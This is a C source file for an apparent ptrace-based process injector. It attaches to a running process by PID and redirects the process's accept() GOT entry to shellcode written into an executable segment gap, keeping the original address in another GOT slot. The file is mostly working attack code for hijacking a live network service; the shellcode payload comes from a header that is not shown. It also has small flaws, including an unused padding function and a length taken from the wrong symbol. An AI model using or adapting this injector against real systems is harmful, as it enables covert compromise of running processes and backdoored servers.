#include "elf_base.h"
#include "got_offset.h"
#include "inject_code.h"
#include "log.h"
#include "seg_gaps.h"
#include "trace.h"
// clang-format off
#include <iso646.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
// clang-format on

#define PADDING 0x10

uint64_t elf_base;
uint32_t pid;

void *
code_padding (char *code, uint32_t *len)
{
  size_t addtional_pad_len = PADDING - (*len % 8);

  void *inject_code = malloc (*len + addtional_pad_len);
  memset (inject_code, '\x90', addtional_pad_len);
  memcpy (inject_code + addtional_pad_len, code, *len);
  *len += addtional_pad_len;

  return inject_code;
}

void
do_inject_code (size_t addr, char *code)
{
  uint32_t len = sizeof (inject_code) - 1;
  copy_to_traee (pid, addr, code, len);
}

void
hjack_got (uint64_t got_offset, uint64_t hjack_to)
{
  uint64_t got_addr = elf_base + got_offset;
  copy_to_traee (pid, got_addr, (char *)&hjack_to, sizeof (size_t));
}

int
main (int argc, char **argv)
{
  if (argc != 2)
    PEXIT ("usage: injector pid");
  pid = strtol (argv[1], NULL, 0);

  attach (pid);
  ptrace (PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

  elf_base = parse_elf_base (pid);

  uint64_t accept_adr;
  uint64_t shellcode_start = elf_base + rx_gap_start;
  uint64_t accept_got = elf_base + accept_offset;
  uint64_t __libc_start_main_got = elf_base + __libc_start_main_offset;

  copy_from_tracee (pid, accept_got, (char *)&accept_adr, 0x8);
  copy_to_traee (pid, __libc_start_main_got, (char *)&accept_adr, 0x8);
  // use __libc_start_main_got to restore accept
  copy_to_traee (pid, accept_got, (char *)&shellcode_start, 0x8);
  // copy shellcode_start to accept_got

  do_inject_code (shellcode_start, inject_code);
  // 0x55a20c645000

  detach (pid);
}
